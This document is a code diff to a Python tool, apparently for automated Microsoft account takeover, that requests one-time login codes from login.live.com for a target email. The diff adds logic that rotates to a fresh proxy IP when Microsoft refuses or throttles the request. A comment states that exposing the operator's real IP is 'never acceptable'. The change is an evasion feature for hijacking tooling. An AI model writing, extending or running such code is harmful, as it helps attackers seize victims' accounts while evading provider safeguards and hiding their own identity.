@@ -1,4 +1,6 @@
 from securing.utils.cookies.get_livedata import livedata
+from securing.auth.initial_session import get_session
+from securing.utils.proxy import close_session
 import asyncio
 import json
 import logging
@@ -173,6 +175,7 @@ async def send_auth(session: httpx.AsyncClient, email: str, proof: str = None) -
             # field is a proof name, not whatever we happened to have at hand.
             steer = proof or (proof_display if not chosen_is_default else None)
 
+            gotc_fail_count = 0
             for idx, (purpose, force) in enumerate(gotc_plan):
                 if idx:
                     # Space the retries out: MS throttles rapid repeats.
@@ -230,6 +233,7 @@ async def send_auth(session: httpx.AsyncClient, email: str, proof: str = None) -
                     break
                 err = body.get("error") or body.get("ErrorCode") or body.get("errorCode")
                 gotc_hard_reject = err or state or gotc.status_code
+                gotc_fail_count += 1
                 log.warning(
                     "send_auth: GetOneTimeCode purpose=%s not sent for %s "
                     "(http=%s state=%s error=%s)",
@@ -239,8 +243,74 @@ async def send_auth(session: httpx.AsyncClient, email: str, proof: str = None) -
                     state,
                     err,
                 )
+                # State 206 = MS refused to send (not rate limit, more like
+                # "this proof can't receive OTP"). Track for potential
+                # proxy-vs-direct fallback below.
+                if state in (206, 204):
+                    gotc_fail_count += 1
 
             if not gotc_sent:
+                # Some exit IPs make MS answer 206/204 on every purpose. Retry the
+                # same request through a *fresh proxy exit* (a new sticky session
+                # gets a different IP) before giving up - going direct would leak
+                # the host IP to login.live.com, which is never acceptable here.
+                if gotc_fail_count >= 3 and getattr(
+                    session, "_autosecure_proxy_url", None
+                ):
+                    print(
+                        "[~] - GOTC refused on this exit, retrying via a new proxy...",
+                        flush=True,
+                    )
+                    retry_session = None
+                    try:
+                        retry_session = get_session()
+                        for idx, (purpose, force) in enumerate(gotc_plan[:2]):
+                            if idx:
+                                await asyncio.sleep(2.0)
+                            payload2 = {
+                                "login": email,
+                                "flowtoken": flowtoken,
+                                "purpose": purpose,
+                                "channel": "Email",
+                                "ChallengeViewSupported": 1,
+                                "AltEmailE": altemaile,
+                                "lcid": 1033,
+                            }
+                            if force:
+                                payload2["forceotclogin"] = True
+                            gotc2 = await retry_session.post(
+                                url="https://login.live.com/GetOneTimeCode.srf?id=38936",
+                                headers={
+                                    "Accept": "application/json",
+                                    "Content-type": "application/x-www-form-urlencoded",
+                                },
+                                data=payload2,
+                            )
+                            print(
+                                f"GetOneTimeCode[retry-{purpose}]: {gotc2.status_code} "
+                                f"{(gotc2.text or '')[:300]}"
+                            )
+                            try:
+                                body2 = gotc2.json() or {}
+                            except Exception:
+                                body2 = {}
+                            if not isinstance(body2, dict):
+                                body2 = {}
+                            if _gotc_state_ok(body2):
+                                gotc_sent = True
+                                gotc_flowtoken = body2.get("FlowToken") or body2.get(
+                                    "flowToken"
+                                ) or gotc_flowtoken
+                                print(
+                                    "[+] - GOTC accepted on the fresh proxy exit",
+                                    flush=True,
+                                )
+                                break
+                    except Exception as exc:
+                        log.warning("send_auth: proxy retry for GOTC failed: %s", exc)
+                    finally:
+                        await close_session(retry_session)
+
                 # Say it plainly: nothing was mailed, so waiting on an inbox is
                 # pointless. Callers use ``otc_sent`` to skip that wait.
                 print(
